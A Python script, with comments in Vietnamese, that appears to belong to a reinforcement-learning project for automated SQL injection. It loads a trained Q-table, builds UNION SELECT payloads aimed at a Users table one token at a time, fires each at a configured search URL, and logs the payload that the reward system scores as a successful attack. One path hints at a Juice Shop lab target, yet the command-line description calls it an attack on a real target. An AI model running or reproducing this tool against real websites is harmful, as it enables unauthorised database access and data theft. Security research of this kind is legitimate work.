#predict_payload.py
import random
import numpy as np
import configparser
import sys
import os  # Cần cho việc tắt 'print'
import logging
import argparse

# --- Import các thành phần CỐT LÕI ---
from src.agent.q_table import QTable
from src.core.action_space import ActionSpace
# --- Import các thành phần MÔI TRƯỜNG (để tự kiểm tra) ---
from src.utils.http_client import HttpClient
from src.core.reward_system import RewardSystem

# --- XÓA CÁC THAM SỐ CŨ (để argparse quản lý) ---
# CONFIG_FILE = "config/config_target.ini"  <-- XÓA
# MODEL_FILE = "results/target_results/juiceshop_model_v1.json" <-- XÓA
# NUMBER_OF_ATTEMPTS = 200 <-- XÓA
# PREDICT_EPSILON = 0.05   <-- XÓA
# --------------------

# --- THAY ĐỔI CÀI ĐẶT LOGGING ---
# Chúng ta sẽ cài đặt logging bên trong hàm run_automated_prediction
# sau khi biết đường dẫn output_dir
# -----------------------------------

# --- THÊM 3 DÒNG CÀI ĐẶT LOGGING ---
# Đảm bảo thư mục tồn tại trước khi cài đặt FileHandler
# os.makedirs("results/target_results", exist_ok=True)
# LOG_FILE = "results/target_results/predict_log.txt"
# logging.basicConfig(level=logging.INFO, 
                    # format='%(asctime)s - %(message)s',
                    # handlers=[logging.FileHandler(LOG_FILE, mode='w', encoding='utf-8'), logging.StreamHandler()])
# -----------------------------------


def run_automated_prediction(config_path, model_path, output_dir, attempts, epsilon):
    """
    Tự động tạo payload và kiểm tra chúng cho đến khi thành công
    hoặc hết số lần thử. (ĐÃ SỬA LỖI LOGIC)
    """
    
    # --- 1. CÀI ĐẶT LOGGING ĐỘNG (Giữ nguyên) ---
    os.makedirs(output_dir, exist_ok=True)
    LOG_FILE = os.path.join(output_dir, "predict_log.txt")
    
    root_logger = logging.getLogger()
    if root_logger.hasHandlers():
        root_logger.handlers.clear()

    logging.basicConfig(level=logging.INFO, 
                        format='%(asctime)s - %(message)s',
                        handlers=[logging.FileHandler(LOG_FILE, mode='w', encoding='utf-8'), 
                                  logging.StreamHandler()])
    # ---------------------------------
    logging.info(f"--- Bắt đầu tự động dự đoán (tối đa {attempts} lần) ---")
    logging.info(f"Sử dụng Config: {config_path}")
    logging.info(f"Sử dụng Model: {model_path}")
    logging.info(f"Độ ngẫu nhiên (Epsilon): {epsilon}")
    
    # 1. Đọc Cấu hình (Giữ nguyên)
    config = configparser.ConfigParser()
    config.read(config_path, encoding='utf-8')
    try:
        max_steps = int(config['Training']['max_steps_per_episode'])
        search_url = config['Target']['search_url']
        search_param = config['Target'].get('search_param', 'q')
        normal_count = int(config['Environment']['normal_result_count'])
        success_marker = config['Environment']['success_marker']
        error_marker = config['Environment']['sql_error_marker']
    except KeyError as e:
        logging.error(f"Lỗi: Thiếu key {e} trong file config '{config_path}'. Dừng lại.")
        return
    except Exception as e:
        logging.error(f"Lỗi khi đọc config: {e}. Dừng lại.")
        return

    # 2. Khởi tạo các thành phần (Giữ nguyên)
    action_space = ActionSpace()
    q_table = QTable(action_space.get_action_space_size())
    http_client = HttpClient()
    reward_system = RewardSystem(normal_count, success_marker, error_marker)

    # 3. Tải model "bộ não" (Giữ nguyên)
    try:
        q_table.load(model_path)
        logging.info(f"[QTable] Đã tải model từ: {model_path}")
    except FileNotFoundError:
        logging.error(f"Lỗi: Không tìm thấy tệp model tại '{model_path}'. Dừng lại.")
        return
    except Exception as e:
        logging.error(f"Lỗi khi tải model: {e}. Dừng lại.")
        return

    # 4. VÒNG LẶP TỰ ĐỘNG THỬ NGHIỆM (ĐÃ VIẾT LẠI HOÀN TOÀN)
    found_success = False
    for attempt in range(attempts):
        logging.info(f"\n--- Lần thử {attempt + 1}/{attempts} ---")
        
        current_state = ""
        generated_payload = ""
        
        # Biến cờ để biết lần thử này có thất bại không
        failed_this_attempt = True 

        for step in range(max_steps):
            q_values = q_table.get(current_state)
            
            if random.uniform(0, 1) < epsilon:
                best_action_index = random.randint(0, action_space.get_action_space_size() - 1)
            else:
                best_action_index = np.argmax(q_values)
            
            action_string = action_space.get_action_string(best_action_index)
            
            # --- [SỬA 1] LOGIC GHÉP TỪ (GIỐNG STATE MANAGER) ---
            # Nếu không có đoạn này, agent sẽ ghép thành "UNIONSELECT" (sai cú pháp)
            if action_string in ["UNION", "SELECT", "FROM", "Users", "WHERE", "NULL"]:
                generated_payload += " " + action_string
            elif action_string.startswith(",") or action_string.startswith("--") or action_string.startswith(")"):
                generated_payload += action_string
            else:
                generated_payload += action_string
            # ---------------------------------------------------

            current_state = generated_payload
            
            # Gửi request kiểm tra
            response = http_client.send_search_query(search_url, generated_payload, search_param)
            
            # Tắt tiếng RewardSystem
            original_stdout = sys.stdout
            sys.stdout = open(os.devnull, 'w')
            try:
                reward, done = reward_system.calculate_reward(response, generated_payload)
            finally:
                sys.stdout.close()
                sys.stdout = original_stdout
            
            # --- [SỬA 2] CHỈ BÁO THÀNH CÔNG KHI REWARD DƯƠNG ---
            if done: 
                if reward > 0:  # <--- QUAN TRỌNG: Phải thắng mới được ăn mừng
                    clean_payload = generated_payload
                    if "--" in generated_payload:
                        clean_payload = generated_payload.split('--', 1)[0] + '--'

                    logging.info(f"\n========================================")
                    logging.info(f"!!! TẤN CÔNG THÀNH CÔNG (Reward={reward}) TẠI STEP {step} !!!")
                    logging.info(f"Payload: {clean_payload}") 
                    logging.info(f"========================================")
                    
                    found_success = True
                    failed_this_attempt = False
                else:
                    # done = True nhưng reward âm (nghĩa là bị block hoặc lỗi nặng)
                    # logging.info(f"  -> Thất bại (Reward: {reward}). Bị chặn hoặc lỗi SQL.")
                    pass 
                
                break # Thoát vòng lặp step dù thắng hay thua
            
            if len(generated_payload) > 120 and step > 25:
                break
        
        # Chỉ in 'Thất bại' nếu lần thử này thực sự thất bại (không 'done')
        if failed_this_attempt:
            logging.info(f"  Payload cuối: {generated_payload!r}")
            logging.info(f"  Kết quả: Thất bại. Đang thử lại...")

    # Hết vòng lặp 'for attempt...'
    if not found_success:
        logging.info(f"\n--- Đã hết {attempts} lần thử. Không tìm thấy payload thành công. ---")
        logging.info("Mẹo: Hãy thử tăng '--attempts', hoặc huấn luyện (main.py) thêm.")

# --- Chạy hàm chính ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Chạy dự đoán payload TẤN CÔNG MỤC TIÊU THỰC TẾ.")
    
    # Đã xóa --mode
    
    # Cập nhật các đối số để có default của 'target'
    parser.add_argument(
        '--config', 
        type=str, 
        default="config/config_target.ini", # <-- Mặc định là config target
        help="Đường dẫn tới file config (mặc định: config/config_target.ini)"
    )
    
    parser.add_argument(
        '--model', 
        type=str, 
        default="results/target_results/target_model.json", # <-- Mặc định là model target
        help="Đường dẫn tới file model (mặc định: results/target_results/target_model.json)"
    )
    
    parser.add_argument(
        '--output_dir', 
        type=str, 
        default="results/target_results", # <-- Mặc định là output target
        help="Thư mục để lưu log (mặc định: results/target_results)"
    )
    
    # Giữ nguyên 2 tham số này
    parser.add_argument(
        '--attempts', 
        type=int, 
        default=100, 
        help="Số lần thử tạo và kiểm tra payload"
    )
    parser.add_argument(
        '--epsilon', 
        type=float, 
        default=0.05, 
        help="Tỷ lệ khám phá (0.0 là khai thác 100%, 1.0 là ngẫu nhiên 100%)"
    )
    
    args = parser.parse_args()

    # ĐÃ XÓA TẤT CẢ LOGIC 'if args.mode'
    
    # Chỉ cần kiểm tra xem model target có tồn tại không
    if not os.path.exists(args.model):
        logging.error(f"Lỗi: Không tìm thấy model tại đường dẫn '{args.model}'")
        logging.error("Bạn đã chạy 'main.py --mode target' để huấn luyện model chưa?")
        sys.exit(1) # Dừng script
        
    # CHẠY HÀM PREDICT
    run_automated_prediction(
        config_path=args.config,
        model_path=args.model,
        output_dir=args.output_dir,
        attempts=args.attempts,
        epsilon=args.epsilon
    )